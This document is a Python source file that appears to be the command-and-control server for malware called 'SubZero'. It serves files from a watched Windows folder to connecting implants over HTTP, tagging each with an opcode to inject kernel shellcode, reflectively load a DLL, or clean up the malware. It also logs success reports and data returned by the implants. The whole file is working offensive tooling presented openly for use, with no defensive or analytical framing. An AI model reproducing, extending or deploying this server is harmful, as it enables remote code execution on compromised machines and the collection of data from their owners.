from http.server import BaseHTTPRequestHandler, HTTPServer
from watchdog.observers import Observer
from watchdog.events import PatternMatchingEventHandler
import os
import queue
import urllib

# General constants
PORT = 8080
WATCHED_PATH = "C:\\temp\\SubZeroWatchedFolder\\"

# Queue deceleration and constants
q = queue.Queue()
OPCODE = 0
FILE_PATH = 1

# Opcodes constant values
KEEP_ALIVE_OPCODE = 0


class ServerOpcode:
    InjectKernelShellcode, LoadLibraryReflectively, Cleanup, *_ = range(1, 10)


class ClientOpcode:
    Success, Failure, *_ = range(1, 10)


def OnFileCreation(event):
    if os.path.isdir(event.src_path):
        return

    if event.src_path.lower().endswith("cleanup"):
        server_opcode = ServerOpcode.Cleanup
        print(f"[SERVER] Cleanup file detected.")
    else:
        server_opcode = ServerOpcode.LoadLibraryReflectively if event.src_path.endswith(".dll") else ServerOpcode.InjectKernelShellcode
        print(f"[SERVER] {event.src_path} creation detected.")
    q.put((server_opcode, event.src_path))


def DirectoryWatchdogSetup():
    patterns = "*"
    ignore_patterns = ""
    ignore_directories = False
    case_sensitive = True
    my_event_handler = PatternMatchingEventHandler(patterns, ignore_patterns, ignore_directories, case_sensitive)
    my_event_handler.on_created = OnFileCreation

    go_recursively = True
    observer = Observer()
    observer.schedule(my_event_handler, WATCHED_PATH, recursive=go_recursively)
    return observer


class Handler(BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'

    def do_GET(self):
        server_opcode = KEEP_ALIVE_OPCODE
        packet_body = b""

        if not q.empty():
            item = q.get()
            q.task_done()
            server_opcode = item[OPCODE]

            if server_opcode != ServerOpcode.Cleanup:
                print(f"[SERVER] Sending {item[FILE_PATH]} to {self.client_address[0]}...")

                with open(item[FILE_PATH], 'rb') as file:
                    packet_body = file.read()
            else:
                print(f"[SERVER] Removing malware from {self.client_address[0]}...")

        self.send_response(200)
        self.send_header("Opcode", server_opcode)
        self.end_headers()

        self.wfile.write(packet_body)

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        packet_patrameters = urllib.parse.parse_qs(self.rfile.read(length).decode('utf-8'))

        client_opcode = ord(packet_patrameters["Opcode"][0])

        if client_opcode != KEEP_ALIVE_OPCODE:

            # USE match STATEMENT ON PYTHON 3.10 FOR A MORE COMPLEX SWITCH - CURRENTLY ON BETA
            if client_opcode == ClientOpcode.Success:
                print(f"[{self.client_address[0]}] Operation completed successfully.")
            else:
                print(f"[{self.client_address[0]}] Operation failed.")

            if 'Returned-Data' in packet_patrameters:
                print(f"[{self.client_address[0]}] Returned Data: \n{packet_patrameters['Returned-Data'][0]}")



if __name__ == "__main__":

    observer = DirectoryWatchdogSetup()
    observer.start()

    for filename in os.listdir(WATCHED_PATH):
        if filename.lower().endswith("cleanup"):
            server_opcode = ServerOpcode.Cleanup
            print(f"[SERVER] Found cleanup file in watched directory.")
        else:
            print(f"[SERVER] Found {filename} in watched directory")
            server_opcode = ServerOpcode.LoadLibraryReflectively if filename.endswith(".dll") else ServerOpcode.InjectKernelShellcode

        q.put((server_opcode, WATCHED_PATH + filename))

    Server = HTTPServer(('', PORT), Handler)
    print("[SERVER] Server started. Listening...")
    try:
        Server.serve_forever()

    except KeyboardInterrupt:
        print("[SERVER] Stopping Server...")

    observer.stop()
    observer.join()

    Server.server_close()
    print("[SERVER] Server stopped.")
